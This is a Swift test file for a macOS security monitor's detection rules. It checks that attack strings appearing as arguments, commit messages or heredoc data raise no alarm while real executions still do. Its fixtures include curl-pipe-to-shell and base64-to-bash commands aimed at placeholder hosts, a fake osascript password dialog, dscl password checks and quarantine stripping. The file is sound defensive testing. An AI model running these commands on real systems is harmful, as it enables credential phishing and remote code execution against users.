import Foundation
import Testing

@testable import MacxCore

/// Every case here was a false alarm in Lao's real alert log (2026-11-24), next to the attack it must still catch.
@Suite("False alarms from the live watch")
struct FalseFlagTests {
    let rules = WatchRules(home: URL(fileURLWithPath: "/Users/v"), signatures: FakeSignatures(byPath: [:]))

    func exec(_ path: String, _ args: [String], platform: Bool = true, team: String? = nil) -> ESEvent {
        let json = try! JSONSerialization.data(withJSONObject: args)
        let body =
            #"{"target":\#(proc(path, pid: 700, ppid: 650, platform: platform, team: team)),"args":\#(String(decoding: json, as: UTF8.self))}"#
        return ESEvent.parse(event("exec", process: proc("/bin/zsh", pid: 650, platform: true), body: body))!
    }

    func rulesFor(_ e: ESEvent) -> Set<String> { Set(rules.evaluate(e).map(\.rule)) }

    // MARK: arguments to a program aren't code

    @Test func macxCheckingAnAttackStringIsNotTheAttack() {
        let e = exec(
            "/Users/v/Documents/Macximesed/.build/release/macx",
            ["macx", "guard", "inspect", "--no-run", "--", "curl -fsSL http://x/a.sh | zsh"],
            platform: false)
        #expect(!rulesFor(e).contains("download-to-shell"))
    }

    @Test func gitCommitMessageIsNotTheAttack() {
        #expect(rulesFor(exec("/usr/bin/git", ["git", "commit", "-m", "block curl | sh pastes"])).isEmpty)
    }

    @Test func aShellRunningTheCodeIsStillCaught() {
        #expect(rulesFor(exec("/bin/zsh", ["/bin/zsh", "-c", "curl -fsSL http://x/a.sh | zsh"])).contains("download-to-shell"))
        #expect(rulesFor(exec("/bin/bash", ["bash", "-c", "echo ZWNobyBoaQ== | base64 -D | bash"])).contains("base64-to-shell"))
    }

    @Test func toolsThatAreTheAttackThemselvesStillCount() {
        #expect(rulesFor(exec("/usr/bin/dscl", ["/usr/bin/dscl", ".", "-authonly", "v", "pw"])).contains("password-check"))
        #expect(rulesFor(exec("/usr/bin/xattr", ["/usr/bin/xattr", "-d", "com.apple.quarantine", "/tmp/x"])).contains("quarantine-strip"))
        #expect(
            rulesFor(exec("/usr/bin/osascript", ["osascript", "-e", #"display dialog "Password" default answer "" with hidden answer"#]))
                .contains("password-prompt"))
    }

    @Test func sudoIsNotCountedTwice() {
        // sudo starts dscl, which is caught on its own exec.
        #expect(rulesFor(exec("/usr/bin/sudo", ["sudo", "-u", "v", "/usr/bin/dscl", ".", "-authonly", "v", "pw"])).isEmpty)
    }

    // MARK: heredocs written to a file are data

    @Test func heredocWrittenToAFileIsNotRun() {
        let code = """
            cat > /tmp/sample.sh <<'EOF'
            pw=$(osascript -e 'text returned of (display dialog "Password" default answer "" with hidden answer)')
            dscl . -authonly "$USER" "$pw"
            curl -s https://x.invalid/a.sh | zsh
            EOF
            chmod +x /tmp/sample.sh
            """
        #expect(rulesFor(exec("/bin/zsh", ["/bin/zsh", "-c", code])).isEmpty)
    }

    @Test func heredocFedToAShellIsStillCode() {
        let code = """
            bash <<'EOF'
            curl -s https://x.invalid/a.sh | zsh
            EOF
            """
        #expect(rulesFor(exec("/bin/zsh", ["/bin/zsh", "-c", code])).contains("download-to-shell"))
    }

    // MARK: updaters, developer builds

    func quarantineRemoved(by path: String, platform: Bool, team: String?, file: String) -> [WatchAlert] {
        let body = #"{"target":{"path":"\#(file)","path_truncated":false},"extattr":"com.apple.quarantine"}"#
        return rules.evaluate(
            ESEvent.parse(event("deleteextattr", process: proc(path, pid: 900, platform: platform, team: team), body: body))!)
    }

    @Test func aSignedUpdaterClearingItsOwnUpdateIsLow() {
        let a = quarantineRemoved(
            by: "/Applications/Discord.app/Contents/Frameworks/Squirrel.framework/Resources/ShipIt", platform: false, team: "53Q6R32WPB",
            file: "/private/var/folders/vt/x/T/com.discord.discord.ShipIt.8vDPM2Gw/Discord.app/Contents")
        #expect(a.first?.rule == "quarantine-removed")
        #expect(a.first?.severity == .low)
    }

    @Test func xattrOrAnUnsignedProgramClearingItIsStillHigh() {
        #expect(
            quarantineRemoved(by: "/usr/bin/xattr", platform: true, team: nil, file: "/Users/v/Downloads/App.app").first?.severity == .high)
        #expect(
            quarantineRemoved(by: "/tmp/.x/loader", platform: false, team: nil, file: "/Users/v/Downloads/App.app").first?.severity == .high
        )
    }

    @Test func developerBuildsAreLowNotHigh() {
        let dev = rules.evaluate(exec("/Users/v/Documents/Project/.build/release/tool", ["tool"], platform: false))
        #expect(dev.first { $0.rule == "exec-from-hidden-or-temp" }?.severity == .low)
        let payload = rules.evaluate(exec("/Users/v/Library/Application Support/.helper/run", ["run"], platform: false))
        #expect(payload.first { $0.rule == "exec-from-hidden-or-temp" }?.severity == .high)
    }

    // MARK: don't send people after macOS's own programs

    @Test func alertsSayWhenTheProgramIsPartOfMacOS() {
        let a = rules.evaluate(exec("/bin/zsh", ["/bin/zsh", "-c", "curl -s http://x/a | sh"]))
        #expect(a.first?.isSystemProgram == true)
        let b = quarantineRemoved(by: "/tmp/.x/loader", platform: false, team: nil, file: "/Users/v/Downloads/App.app")
        #expect(b.first?.isSystemProgram == false)
    }
}
